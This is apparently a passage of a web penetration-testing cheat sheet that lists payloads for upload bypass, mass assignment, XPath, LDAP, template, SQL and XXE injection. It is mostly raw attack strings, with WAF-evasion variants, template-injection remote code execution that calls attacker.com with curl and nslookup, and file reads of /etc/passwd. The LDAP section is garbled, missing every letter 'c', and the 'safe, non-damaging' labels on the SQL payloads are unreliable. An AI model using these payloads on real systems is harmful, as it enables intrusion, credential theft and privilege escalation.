* Session file injection:  /var/lib/php/sessions/sess_id

# 🔹 Advanced Upload Exploitation

* Overwrite config file:  .htaccess or .env
* Overwrite existing file:  index.php
* Upload cron job:  /etc/cron.d/shell
* Upload SSH key:  authorized_keys

# 🔹 WAF Bypass Techniques (File Upload)
## 🧩 Extension Obfuscation

* Mixed case: shell.pHp
* Unicode extension:  shell.ph\u0070
* Trailing dot:  shell.php.
* Space bypass:  shell.php 

## 🧩 Encoding Tricks

* URL encoding:  shell%2ephp
* Double encoding:  shell%252ephp
* Null byte encoding:  %00

## 🧩 Content-Type Tricks

* Fake header:  Content-Type: image/jpeg
* Multiple headers:  Duplicate Content-Type fields
* Boundary manipulation:  Modify multipart boundaries

## 🧩 Filename Bypass

* Random filename:  random123.php
* Long filename:  aaaaaaaaaaaaaaaaaaaa.php
* Special characters:  shell.php#.jpg

## 🧩 File Structure Tricks

* Add padding:  Large file with payload inside
* Comment injection:  Hide payload in comments
* Archive wrapping:  Upload ZIP containing shell

# 🔹 Brute Force Upload Payload List
## ✅ Extensions to Try
```
.php
.php3
.php4
.php5
.phtml
.phar
.asp
.aspx
.jsp
.jspx
.py
.cgi
.pl
.sh
```
## ✅ Double Extensions
```
.php.jpg
.php.png
.php.gif
.jpg.php
.png.php
```
## ✅ Obfuscated Extensions
```
.pHp
.phtml
.phP5
.php.
.php%00.jpg
```
## ✅ File Names
```
shell.php
cmd.php
test.php
upload.php
backdoor.php
```
## ✅ MIME Variations
```
image/jpeg
image/png
application/octet-stream
text/plain
multipart/form-data
```
---
# Mass Assignment

> A mass assignment attack is a security vulnerability that occurs when a web application automatically assigns user-supplied input values to properties or variables of a program object. This can become an issue if a user is able to modify attributes they should not have access to, like a user's permissions or an admin flag.

## Summary

* [Methodology](#methodology)
* [Labs](#labs)
* [References](#references)


## Methodology

Mass assignment vulnerabilities are most common in web applications that use Object-Relational Mapping (ORM) techniques or functions to map user input to object properties, where properties can be updated all at once instead of individually. Many popular web development frameworks such as Ruby on Rails, Django, and Laravel (PHP) offer this functionality.

For instance, consider a web application that uses an ORM and has a user object with the attributes `username`, `email`, `password`, and `isAdmin`. In a normal scenario, a user might be able to update their own username, email, and password through a form, which the server then assigns to the user object.

However, an attacker may attempt to add an `isAdmin` parameter to the incoming data like so:

```json
{
    "username": "attacker",
    "email": "attacker@email.com",
    "password": "unsafe_password",
    "isAdmin": true
}
```

If the web application is not checking which parameters are allowed to be updated in this way, it might set the `isAdmin` attribute based on the user-supplied input, giving the attacker admin privileges


## Labs

* [PentesterAcademy - Mass Assignment I](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1964)
* [PentesterAcademy - Mass Assignment II](https://attackdefense.pentesteracademy.com/challengedetailsnoauth?cid=1922)
* [Root Me - API - Mass Assignment](https://www.root-me.org/en/Challenges/Web-Server/API-Mass-Assignment)

# 🔹 Basic API Mass Assignment Payloads
a
* Simple role escalation (JSON):  `{"role":"admin"}` → Adds hidden role field in API request.
* Admin flag injection:  `{"isAdmin":true}` → Gains elevated privileges.
* Access level override:  {"access_level":999}` → Maximum permission.
* User type switch:  `{"user_type":"admin"}`
* Boolean privilege abuse:  `{"admin":1}`

# 🔹 REST API Object Injection

* Full object overwrite:
  ```json
  {
    "user":{
      "role":"admin",
      "id":1
    }
  }
  ```
* Nested privilege injection:
  ```json
  {
    "profile":{
      "settings":{
        "isAdmin":true
      }
    }
  }
  ```
* Hidden field inclusion:
  ```json
  {
    "email":"user@test.com",
    "verified":true
  }
  ```
# 🔹 PUT / PATCH Abuse (Full Object Update)
* Replace entire object:
  ```json
  {
    "id":1,
    "role":"admin",
    "permissions":"all"
  }
  ```
* Partial update abuse:
  ```json
  {
    "role":"admin"
  }
  ```
* Add unauthorized field:
  ```json
  {
    "internal":true
  }
  ```
# 🔹 Account Takeover via API

* ID override:
  ```json
  {"user_id":1}
  ```
* Owner change:
  ```json
  {"owner_id":1}
  ```
* Email takeover:
  ```json
  {"email":"attacker@evil.com"}
  ```
* Username impersonation:
  ```json
  {"username":"admin"}
  ```

# 🔹 Bulk API Abuse

* Batch update:
  ```json
  {
    "users":[
      {"id":1,"role":"admin"},
      {"id":2,"role":"admin"}
    ]
  }
  ```
* Mass privilege escalation:
  ```json
  {
    "accounts":[{"access_level":999}]
  }
  ```
# 🔹 Business Logic Manipulation (API)

* Payment tampering:
  ```json
  {"amount":1}
  ```
* Discount abuse:
  ```json
  {"discount":100}
  ```
* Plan upgrade:
  ```json
  {"plan":"enterprise"}
  ```
* Order manipulation:
  ```json
  {"status":"completed"}
  ```

# 🔹 JSON Parameter Pollution (API)

* Duplicate key override:
  ```json
  {"role":"user","role":"admin"}
  ```

* Array confusion:
  ```json
  {"role":["user","admin"]}
  ```

* Null override:
  ```json
  {"role":null,"role":"admin"}
  ```

* Boolean conflict:
  ```json
  {"isAdmin":false,"isAdmin":true}
  ```

# 🔹 Advanced API Object Tricks

* Metadata injection:
  ```json
  {"meta":{"role":"admin"}}
  ```
* Config override:
  ```json
  {"config":{"debug":true}}
  ```
* Dot notation:
  ```json
  {"user.role":"admin"}
  ```
* Prototype style:
  ```json
  {"__proto__":{"admin":true}}
  ```

# 🔹 Content-Type Based Bypass

* JSON as text:  
  `Content-Type: text/plain`  
  → Backend still parses JSON.

* Form instead of JSON:  
  `role=admin&isAdmin=true`

* Multipart request:
  ```
  Content-Type: multipart/form-data
  role=admin
  ```

# 🔹 WAF Bypass Techniques (API Mass Assignment)

## 🧩 Encoding Tricks

* URL encoding:    `%72%6f%6c%65=admin`
* Double encoding:    `%2572%256f%256c%2565=admin`
* Unicode encoding: 
  ```json
  {"r\u006fle":"admin"}
  ```

## 🧩 Case Variation

* Mixed case keys:
  ```json
  {"RoLe":"AdMiN"}
  ```

* Uppercase keys:
  ```json
  {"ROLE":"ADMIN"}
  ```

## 🧩 Nested Structure Bypass

* Deep nesting:
  ```json
  {"data":{"user":{"role":"admin"}}}
  ```

* Wrapper bypass:
  ```json
  {"payload":{"role":"admin"}}
  ```

## 🧩 Duplicate Override

* Multi-layer override:
  ```json
  {"role":"user","data":{"role":"admin"}}
  ```

## 🧩 Field Explosion

* Many fields injected:
  ```json
  {
    "role":"admin",
    "isAdmin":true,
    "access":999,
    "permissions":"all"
  }
  ```
- -------------
## Web Cache Deception Attack

### Steps:
1. Browse normally: `https://www.example.com/myaccount/home/`
2. Open malicious link: `https://www.example.com/myaccount/home/malicious.css`
3. The cache saves the page.
4. Open in a private tab: `https://www.paypal.com/myaccount/home/malicious.css`

### Cache Poisoning Headers:
- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`

### Example Attack:
```http
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>
```
---

## Insecure Direct Object References (IDOR)
Insecure Direct Object References (IDOR) is a security vulnerability that occurs when an application allows users to directly access or modify objects (such as files, database records, or URLs) based on user-supplied input, without sufficient access controls. This means that if a user changes a parameter value (like an ID) in a URL or API request, they might be able to access or manipulate data that they aren’t authorized to see or modify.

any parametes parsent do the modification as well hiden parameters.

### Tools:
•	PortSwigger/BApp Store > Authz
•	PortSwigger/BApp Store > AuthMatrix
•	PortSwigger/BApp Store > Autorize

### Example Parameters:
- `http://foo.bar/somepage?invoice=12345`
- `http://foo.bar/changepassword?user=someuser`
- `http://foo.bar/showImage?img=img00011`
- `https://example.com/profile?user_id=123:`c

### Examples:
1. **Forgot Password Flow:**
   - Intercept request containing `email` and `user_id`.
   - Modify parameters and check for unauthorized access.

2. **Facebook Page Deletion Attack:**
   - If a page delete request contains `page_id`, replace it with another user's ID to delete their page.

3. **Comment Modification:**
   - Modify `uid` in request to change another user's comment.

4. **Account Takeover:**
   - Modify `profile_id` in a profile update request to edit another user's account.

**References:**
- [HackerOne Report 227522](https://hackerone.com/reports/227522)
- [HackerOne Report 322661](https://hackerone.com/reports/322661)
---

## XPATH Injection

### Example Payloads:
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
```
# 🔹 Basic XPath Injection Payloads

* Simple boolean injection:    `' or '1'='1` → Always true condition.
* Numeric bypass:    `1 or 1=1` → Bypasses numeric filters.
* Closing quote injection:    `' or 'a'='a` → Breaks query logic.
* AND logic test:    `' and '1'='1` → Validates injection point.
* False condition test:    `' and '1'='2` → Used for boolean testing.

# 🔹 Authentication Bypass Payloads

* Login bypass (classic):    `' or '1'='1' or ''='` → Bypasses authentication check.
* Username-independent login:    `' or '1'='1` → Ignores password validation.
* Password bypass:    `' or password='admin` → Forces match.
* Multiple OR conditions:    `' or 'a'='a' or 'b'='b` → More reliable bypass.
* Null bypass:   `' or ''='` → Matches empty condition.

# 🔹 XPath Syntax Manipulation

* Close predicate:    `'] | //user | //'` → Breaks out of query path.
* Inject new node:    `' or //user[role='admin'] or '` → Select admin node.
* Axis injection:    `' or //node() or '` → Access all nodes.
* Attribute selection:    `' or //@* or '` → Access all attributes.
* Wildcard selection:    `' or //* or '` → Select entire XML.

# 🔹 Data Extraction Payloads

* Extract usernames:    `' or //user/username/text()='admin`
* Extract all nodes:    `' or //*` → Dumps all XML nodes.
* Extract attributes:    `' or //@*` → Lists attributes.
* Target specific node:   `' or //password/text()='secret`
* Combine nodes:    `' or //user/password/text()='admin`

# 🔹 Blind XPath Injection (Boolean-Based)

* True condition:  `' and string-length(//user[1]/password)=5` → Check length.
* False condition:    `' and string-length(//user[1]/password)=10`
* Character extraction:    `' and substring(//user[1]/password,1,1)='a'`
* Binary search:   `' and substring(//user[1]/password,1,1)>'m'`
* Incremental extraction:    `' and substring(//user[1]/password,2,1)='b'`

# 🔹 Blind XPath Injection (Error-Based)

* Force error:    `' or count(//*)=1 div 0` → Division error.
* Type mismatch:    `' or string-length(//*)='a'` → Causes evaluation error.
* Invalid function:    `' or unknown-function()`

# 🔹 Advanced XPath Injection Payloads

* Namespace bypass:    `' or //*`
* Function abuse:    `' or contains(name(), 'user')`
* Position-based extraction:    `' or //user[position()=1]`
* Count-based logic:   `' or count(//user)=1`
* Attribute filter:    `' or //user[@role='admin']`

# 🔹 WAF Bypass Techniques (XPath Injection)

## 🧩 Encoding Tricks

* URL encoding:    `%27%20or%20%271%27=%271`
* Double encoding:    `%2527%2520or%2520%25271%2527=%25271`
* Unicode encoding:    `\u0027 or \u0031=\u0031`

## 🧩 Case & Obfuscation

* Case variation:   `' Or '1'='1`
* Mixed spacing:    `'  or  '1'  =  '1`
* Tab injection:    `' or%091=1`
* Newline bypass:    `' or%0a1=1`

## 🧩 Filter Bypass Tricks

* Alternate operators:    `or 1=1`
* Concatenation:    `' or concat('a','b')='ab'`
* Function-based logic:    `' or boolean(1)`

## 🧩 Special Character Bypass

* Comment-style injection:    `' or '1'='1'--`
* Breaking quotes:   `"' or "1"="1`
* Mixed quotes:    `' or "a"="a`

## 🧩 Structural Bypass

* Break query structure:    `'] | //* | ['`
* Inject new paths:    `' or //text()`
* Use wildcard nodes:    `' or //*`

```
' or '1'='1
' or 'a'='a
' or 1=1
1 or 1=1
' and '1'='1
' and '1'='2
' or //*
' or //@*
' or //user
' or //password
' or //text()
' and string-length(//user[1]/password)=1
' and substring(//user[1]/password,1,1)='a'
' and substring(//user[1]/password,1,1)='b'
%27%20or%20%271%27=%271
%27%20and%20%271%27=%272
%2527%2520or%2520%25271%2527=%25271
' or contains(//user,'admin')
' or starts-with(//user,'a')
' or count(//user)=1
```
### Blind Exploitation:
```xpath
and string-length(account)=SIZE_INT
```

### Tools:
- [xcat](https://github.com/orf/xcat)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

---

## XSLT Injection

### Description:
Processing an unvalidated XSL stylesheet can allow an attacker to change XML structure, include arbitrary files, or execute commands.

### Tools:
- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#tools)
---
## Template Injection (SSTI)
```
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
<%= system('cat /etc/passwd') %>
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{7*7}}         → 49 (Jinja2, Twig)
${7*7}          → 49 (Velocity)
<%= 7*7 %>      → 49 (EJS)
#{7*7}          → 49 (Pug)
{{7/0}}         → Division error (Jinja2)
${7/0}          → Velocity error
<%= 7/0 %>      → EJS error
{{"a"*5}}       → aaaaa (Jinja2)
${"a".repeat(5)} → aaaaa (Velocity)
<%= "a".repeat(5) %> → aaaaa (EJS)
{{7*7}}
${7*7}
{{ config }}
{{ dump() }}
{{ 1+2 }}
{{7 * 7}}
{ { 7*7 } }
%7B%7B7*7%7D%7D
%257B%257B7*7%257D%257D
{{7*7}}{#comment#}
${{7*7}}
">{{7*7}}
```
# 🔹 Detection

Arithmetic Test : {{7*7}} → Returns 49, confirms SSTI  
Alt Syntax Test : ${7*7} → Detects Freemarker/EL engines  
ERB Test : <%=7*7%> → Ruby/ERB execution check  
Invalid Operation : {{1/0}} → Error-based detection
Jinja2 Object : {{config}} → Flask/Jinja2 detection  
Twig Object : {{_self}} → PHP Twig engine  
Django Object : {{settings}} → Django template engine  
Freemarker Syntax : ${7*7} → Java Freemarker  
Velocity Syntax : #set($x=7*7)$x → Java Velocity

# 🔹 Basic Expression Injection

String Output : {{"test"}} → Confirms evaluation  
Boolean Evaluation : {{7=='7'}} → Type coercion  

# 🔹 File Read

Linux File Read : {{cycler.__init__.__globals__.open('/etc/passwd').read()}} → System file  
Windows File Read : {{open('C:/Windows/win.ini').read()}} → Windows file  
Alt Read : {{config.__class__.__init__.__globals__'/etc/passwd'.read()}}

# 🔹 Remote Code Execution

Basic RCE : {{cycler.__init__.__globals__.os.system('id')}} → Command execution  
Python Import : {{__import__('os').system('id')}} → Direct execution  
Subprocess Exec : {{cycler.__init__.__globals__.subprocess.Popen('id',shell=True)}}  
Freemarker RCE : ${"freemarker.template.utility.Execute"?new()("id")}
Linux Commands : {{__import__('os').system('whoami')}} → User info  
List Files : {{__import__('os').system('ls')}} → Directory listing  
Windows Exec : {{__import__('os').system('whoami')}}
Time Delay : {{__import__('os').system('sleep 5')}} → Delay detection  
DNS Callback : {{__import__('os').system('nslookup attacker.com')}}  
HTTP Callback : {{__import__('os').system('curl attacker.com')}}

# 🔹 WAF Bypass

URL Encoding : %7B%7B7*7%7D%7D → Encoded payload  
Unicode Encoding : \u007b\u007b7*7\u007d\u007d → Filter bypass  
Whitespace Trick : {{ 7 * 7 }} → Bypass strict filters  
Newline Injection : {{7%0a*%0a7}} → Break parsing

# 🔹 Obfuscation

String Split : {{'o'+'s'}} → Avoid keyword detection  
Char Build : {{chr(111)+chr(115)}} → Construct "os"  
Join Trick : {{['o','s']|join}} → Bypass filters
Pipe Execution : {{7|int}} → Filter usage  
Attribute Access : {{request.__class__}} → Hidden objects  
Indirect Access : {{config.items()[0]}}

# 🔹 Context Breaking

Attribute Injection : "{{7*7}}" → Break HTML attribute  
Node Injection : }}<h1>Injected</h1>{{ → HTML injection + SSTI  
Template Breakout : ${{7*7}} → Hybrid parsing

## **LDAP Injection Testcase Names (Names Only)**

# 🔹 Basi LDAP Injetion Payloads

Authentiation Bypass : `*` → Mathes all entries (wildard login)  
Universal True ondition : `*)(uid=*))(|(uid=*` → Fores always true query  
Simple Bypass : `admin*)(|(password=*)` → Bypass password hek  
Wildard Math : `(uid=*)` → Returns all users

# 🔹 Authentiation Bypass

Always True Filter : `*)(|(objetlass=*)),admin*)(|(password=*))→ Mathes any objet  
Password Ignore : `admin)(&)` → Breaks filter logi  
Multi-ondition Bypass : `*)(|(uid=admin)(uid=*))` → Ensures valid math  
User Enumeration : `*)(uid=*))(|(uid=*` → Dumps users list

# 🔹 LDAP Filter Injetion

AND Injetion : `admin)(|(password=*)),*)(uid=*))(|(uid=* Modifies filter ondition  
OR Injetion : `admin*)(|(uid=*))` → Broadens math  
NOT Injetion : `admin)(!(password=wrong))` → Ignores invalid passwords

# 🔹 Data Extration Payloads

All Users Dump : `*)(uid=*)` → Extrat user list  
Email Extration : `*)(mail=*)` → Extrat emails  
Attribute Dump : `*)(|(n=*)(sn=*))` → Extrat names  
Password Attribute : `*)(userPassword=*)` → Reveal password nodes

# 🔹 Blind LDAP Injetion

Boolean True : `*)(uid=admin)` → hek user existene  
Boolean False : `*)(uid=invaliduser)` → ompare response differene  
Length hek : `*)(userPassword=?????)` → Guess password length  
harater Guess : `*)(userPassword=a*)` → Guess first har

# 🔹 Advaned Injetion Payloads

Nested Query Injetion : `*)(|(uid=admin)(mail=*))` → ombine queries  
Objetlass Dump : `*)(objetlass=*)` → Extrat shema objets  
Group Extration : `*)(memberof=*)` → Enumerate groups

# 🔹 LDAP Speial haraters

Wildard Abuse : `*` → Mathes any value  
OR Operator : `|` → Expands query sope  
AND Operator : `&` → hains onditions  
NOT Operator : `!` → Negates ondition

# 🔹 Enoding Triks (WAF Bypass)

URL Enoding : `%2a` → Enoded `*`  
Enoded Parentheses : `%28%29` → Bypass filter parsing  
Double Enoding : `%252a` → WAF bypass  
Uniode Enoding : `\2a` → Esapes speial har

# 🔹 Filter Bypass Tehniques

Whitespae Injetion : `admin )(uid=*)` → Break validation  
ase Variation : `AdMiN*)(|(UID=*))` → Avoid strit mathing  
Attribute onfusion : `n=admin*)(uid=*)` → Modify expeted field  
Partial Injetion : `admin*` → Expand mathes

# 🔹 ontext Breaking Payloads

lose Filter : `)` → Terminate filter early  
Injet New ondition : `)(uid=*)` → Add new lause  
Full Breakout : `*)(|(n=*))` → Esape original query

# 🔹 WAF Bypass (Strutural)

Null Byte Injetion : `%00` → Trunate filter  
Multi-ondition Injetion : `*)(uid=*))(|(uid=*` → omplex bypass  
Nested Wildards : `*admin*` → Math partial values  
Fragment Injetion : `admin*)(|(n=*))`

# 🔹 Brute Fore LDAP Payload List
## ✅ Basi Injetion

```
*
admin*
*)(|(uid=*))
*)(uid=admin)
*)(mail=*)
*)(|(objetlass=*))
admin*)(|(password=*))
*)(|(uid=admin))
*)(uid=*)
*)(n=*)
*)(sn=*)
*)(userPassword=*)
*)(uid=a*)
*)(uid=b*)
*)(uid=admin)
*)(userPassword=a*)
%2a
%28uid=%2a%29
%252a
\2a
```
## SQL Injection (SQLi)
SQL Injection can be:
- GET Based
- POST Based
- Header Based
- Cookie Based

### SQL Injection Detection Payloads
```sh
'
%27
"
%22
#
%23
;
%3B
)
%25%27
/
%3B
```
#### Logical Testing
```sh
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
#### WAF Bypass Techniques
```sh
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%A0and%A01=1%A0--
```
#### Alternative Operators
```sh
AND   -> &&
OR    -> ||
=     -> LIKE, REGEXP, BETWEEN
```

### Blind SQL Injection (Boolean-Based)
```sh
?id=1' and 1=1 --+  # True
?id=1' and 1=2 --+  # False
```
#### Extract Database Name
```sh
?id=1' and substring(database(),1,1)="a" --+
```
### Time-Based SQL Injection
```sh
?id=1' and sleep(10) --+
```
### Identifying Vulnerable Fields
1. Try symbols like `\,',",~, etc.` to generate errors and identify query structure.
2. Test both username and password fields.
3. View source code to identify quote symbols.
4. Use brute-force attacks with default credentials.
5. If registration is open, create an account and escalate privileges.

# ✅ **1. ERROR-BASED SQLi — 60 SAFE WAF-BYPASS *PATTERN* PAYLOADS**

(Non-damaging, trigger *controlled errors only*)

```
1' /*test*/  
1' OR/**/1=1--  
1' oR 1=1--  
1' OrDeR By 9999--  
1' AnD 1=ConVert(int,'x')--  
1' AND (SELECT 1/0)--  
1' AND (SELECT NULL/0)--  
1' AND (SELECT 1 FROM(SELECT 1)a JOIN(SELECT 'x')b)--  
1' AND (ExTrAcTvAlUe(1,concat('~',(SELECT 'x'))))--  
1' AND (UPDATEXML(1,'~','1'))--  
1' || (SELECT CAST('x' AS INT))  
1' || (SELECT 1/0)  
1'%2f%2a%2a%2fOR 1=1--  
1'/*!50000OR*/1=1--  
1'/**_**/OR/**_**/1=1--  
1' AND (SELECT 1 FROM nonexistent_table)--  
1' AND (SELECT COUNT(*) FROM invalid)--  
1" AND (SELECT 1/0)--  
1') AnD (SeLeCt 1/0)--  
1'))) OR (SELECT 1/0)--  
1' AND 1=CAST('abc' AS INT)--  
1' AND JSON_EXTRACT('{"a":1}','$.b')=1  
1' AND (SELECT LENGTH(NULL))--  
1' AND (SELECT SQRT(-1))--  
1'||(SELECT 1/0)--  
1'||(SELECT CAST('x' AS INT))--  
1')OR(SELECT(1/0))--  
1"OR(SELECT(1/0))--  
1' OR 1=(SELECT 1/0)--  
1" OR 1=(SELECT 1/0)--  
1' /*!OR*/ 1=1--  
1' AND RAND()=(SELECT RAND(0) FROM INFORMATION_SCHEMA.TABLES)--  
1' OR ~0--  
1' OR ~~1--  
1' OR 1 REGEXP '[a-'  
1' OR LENGTH((SELECT 'x'))=1--  
1' OR ASCII('A')>60--  
1' OR ASCII('A')<70--  
1 AND (SELECT 1/0)  
1 AND (SELECT 1/(SELECT 0))  
1 AND (SELECT 1 FROM dual WHERE 1/(SELECT 0))  
1 OR (SELECT 1/0)  
1 OR CAST('x' AS INT)  
1 OR 1=(SELECT CAST('x' AS INT))  
1 OR 1 IN (SELECT CAST('x' AS INT))  
1' OR (SELECT NULL/0)--  
1' OR (SELECT POW(0,-1))--  
1' OR (SELECT SQRT(-1))--  
1' OR (SELECT LOG(-1))--  
1' OR (SELECT 1/0 FROM dual)--  
1' OR (SELECT 1/0 UNION SELECT 1)--  
1' OR ROW(1,1)=(SELECT 1,1 FROM dual)--  
1' OR 1=(SELECT NULL/NULL)--  
1' AND (SELECT 1/NULL)--  
1' AND (SELECT CAST(NULL AS INT))--  
1' OR (SELECT CONVERT(INT,'text'))--  
```

---

# ✅ **2. BOOLEAN-BASED SQLi — 60 SAFE WAF-BYPASS *PATTERN* PAYLOADS**

```
1' AND/**/1=1--  
1' AND/**/1=2--  
1' aNd 'a'='a  
1' aNd 'a'='b  
1' OR/**/1=1--  
1' OR/**/1=2--  
1' Or TRUE--  
1' Or FALSE--  
1' XOR 1=1--  
1' XOR 1=0--  
1'||'1'='1  
1'||'1'='0  
1' AND LENGTH('x')=1--  
1' AND LENGTH('x')=2--  
1' AND ASCII('A')=65--  
1' AND ASCII('A')>60--  
1' AND ASCII('A')<70--  
1' OR EXISTS(SELECT 1)--  
1' OR NOT EXISTS(SELECT 1)--  
1' AnD EXISTS(SELECT 1)--  
1' AnD NOT EXISTS(SELECT 1)--  
1 AND/**/1=1  
1 AND/**/1=2  
1 OR/**/1=1  
1 OR/**/1=2  
1' AND 1 IN (1)--  
1' AND 1 IN (2)--  
1' OR 1 IN (1)--  
1' OR 1 IN (2)--  
1 AND ~0=~0  
1 AND ~~1=~~1  
1 AND 'x' LIKE 'x'  
1 AND 'x' LIKE 'y'  
1 OR 'x' LIKE '%'  
1 OR 'x' LIKE '_%'  
1 OR LENGTH('x')>0  
1 OR LENGTH('x')<0  
1' OR (SELECT 1)=1--  
1' OR (SELECT 1)=2--  
1' AND (SELECT 1)=1--  
1' AND (SELECT 1)=2--  
1' OR (SELECT LENGTH('x'))=1--  
1' OR (SELECT LENGTH('x'))=2--  
1' AND (SELECT LENGTH('x'))=1--  
1' AND (SELECT LENGTH('x'))=2--  
1 OR (SELECT 1 FROM dual WHERE 1=1)  
1 OR (SELECT 1 FROM dual WHERE 1=2)  
1' OR JSON_EXTRACT('{"a":1}','$.a')=1--  
1' AND JSON_EXTRACT('{"a":1}','$.a')=1--  
1' OR 1=(~0)  
1' AND 1=(~0)  
1' OR 1=(1>>0)  
1' OR 1=(1<<0)  
1' AND 1=(1>>0)  
1' AND 1=(1<<0)  
1 OR 1=IFNULL(1,0)  
1 OR 1=IFNULL(0,1)  
1 AND 1=IFNULL(1,0)  
```

---

# ✅ **3. TIME-BASED SQLi — 60 SAFE WAF-BYPASS *PATTERN* PAYLOADS**

(All non-harmful, only delay)

```
1' AND SLEEP(1)--  
1' AND SLEEP(2)--  
1'/*test*/AND/**/SLEEP(1)--  
1' OR SLEEP(1)--  
1' oR SLEEP(2)--  
1'||SLEEP(1)--  
1'||pg_sleep(1)--  
1'||pg_sleep(2)--  
1' AND pg_sleep(1)--  
1' AND pg_sleep(2)--  
1' OR pg_sleep(1)--  
1' OR pg_sleep(2)--  
1' AND BENCHMARK(500000,MD5(1))--  
1' OR BENCHMARK(500000,MD5(1))--  
1' AnD IF(1=1,SLEEP(1),0)--  
1' AnD IF(1=2,SLEEP(1),0)--  
1' oR IF(1=1,SLEEP(1),0)--  
1' oR IF(1=2,SLEEP(1),0)--  
1);WAITFOR DELAY '0:0:1'--  
1");WAITFOR DELAY '0:0:1'--  
1') WAITFOR DELAY '0:0:1'--  
1" AND (SELECT SLEEP(1))--  
1' AND (SELECT SLEEP(2))--  
1' OR (SELECT SLEEP(1))--  
1'||(SELECT SLEEP(1))--  
1' OR (SELECT pg_sleep(1))--  
1' AND (SELECT pg_sleep(1))--  
1' OR (SELECT BENCHMARK(1000000,MD5(1)))--  
1 AND SLEEP(1)  
1 AND SLEEP(2)  
1 AND pg_sleep(1)  
1 OR SLEEP(1)  
1 OR SLEEP(2)  
1 OR pg_sleep(1)  
1'/**/AND/**/SLEEP(1)--  
1'/**/OR/**/SLEEP(1)--  
1' /*!AND*/ SLEEP(1)--  
1' /*!OR*/ SLEEP(1)--  
1"AnD SLEEP(1)--  
1')AnD SLEEP(1)--  
1')) AND SLEEP(1)--  
1')) OR SLEEP(1)--  
1'||SLEEP(1)--  
1'%2f%2a%2a%2fAND SLEEP(1)--  
1'%2f%2a%2a%2fOR SLEEP(1)--  
1; SELECT SLEEP(1)--  
1); SELECT SLEEP(1)--  
1" AND (SELECT SLEEP(1) FROM dual)--  
1' AND (SELECT SLEEP(2) FROM dual)--  
1'||(SELECT pg_sleep(1) FROM pg_class)--  
1' AND IFNULL(1,SLEEP(1))--  
1' OR IFNULL(1,SLEEP(1))--  
1' AND CASE WHEN 1=1 THEN SLEEP(1) END--  
1' OR CASE WHEN 1=1 THEN SLEEP(1) END--  
1' AND (SELECT SLEEP(1) WHERE 1=1)--  
1' OR (SELECT SLEEP(1) WHERE 1=1)--  
1' AND (SELECT SLEEP(1) LIMIT 1)--  
1' OR (SELECT SLEEP(1) LIMIT 1)--  
```
## Improper Authorization

Exploiting improper access control by manipulating parameters such as `user_id`.

Example:
- Update profile information after logging out and send the same request again.
- If the information updates, it indicates a vulnerability.

---

## No Rate Limiting

**Example:** Forgot password functionality without rate limiting:

1. Capture request in Burp Suite.
2. Send it to Intruder/Sequencer.
3. Send 10,000 requests.
4. If 10,000 OTPs/SMS are received, the application is vulnerable.

---

## Password Reset Poisoning

Example:
1. Request a password reset link.
2. Change the password manually after login.
3. Check if the previous reset link still works.

If the reset link remains valid, the system is vulnerable.

---

## HSTS Vulnerability
Check using:
- [SSL Labs](https://www.ssllabs.com)
- Burp Suite response analysis

---

## Account Lockout Issues
- No account lockout policy allows brute-force attacks.

## Long Password DoS
Check if the system allows excessively long passwords (>500 characters).

Test with:
- [Password DoS](https://password-dos.herokuapp.com/)

---

## Parameter Tampering in Payment Gateways

### Example: PayPal

Encoded payment parameters:
```
&option_amount1=10.00&option_amount_selection1=pay10&
```

**Steps to Exploit:**
1. Decode base64 values.
2. Modify values (e.g., `10.00` → `1.00`).
3. Re-encode and send the request.
4. If payment is processed at the modified amount, the system is vulnerable.

---

## Privilege Escalation

### Example: Reusing Invitation Links
- If an invitation link does not expire, anyone can use it to join a group.

### Accessing Admin Resources
- Normal users accessing admin panels by modifying request parameters.
- Example: `admin/trustcer`, `admin/reports`, `admin/dashboard`.

---

## 🧬 XML External Entity (XXE) Injection Test Suite

# XML External Entity (XXE) Attack

An **XML External Entity (XXE) attack** is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

## Types of Entities

### Internal Entity  
If an entity is declared within a DTD, it is called an **internal entity**.  
**Syntax:**  
```xml
<!ENTITY entity_name "entity_value">
```

### External Entity  
If an entity is declared outside a DTD, it is called an **external entity** and is identified by `SYSTEM`.  
**Syntax:**  
```xml
<!ENTITY entity_name SYSTEM "entity_value">
```

## Exploiting XXE

Setting the `Content-Type: application/xml` in the request when sending an XML payload to the server can be helpful in exploitation.

### Example: Reading `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM 'file:///etc/passwd'>
]>
<root>&test;</root>
```

Another example:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ELEMENT data (#ANY)>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
# 🔹 Basic XML Injection

Tag Injection : `<user>admin</user>` → Inject new XML node  
Break Structure : `</user><admin>true</admin>` → Modify XML hierarchy  
Attribute Injection : `<user name="admin">` → Override attributes

### 1. Basic External Entity Injection  
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>&xxe;</user>
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<user>&xxe;</user>
Linux File Read : `SYSTEM "file:///etc/passwd"` → Sensitive file access  
Config File Read : `SYSTEM "file:///var/www/config.xml"` → Application secrets  
Env File Read : `SYSTEM "file:///proc/self/environ"` → Environment variables
```

### 2. Blind XXE via Out-of-Band DNS  
```xml
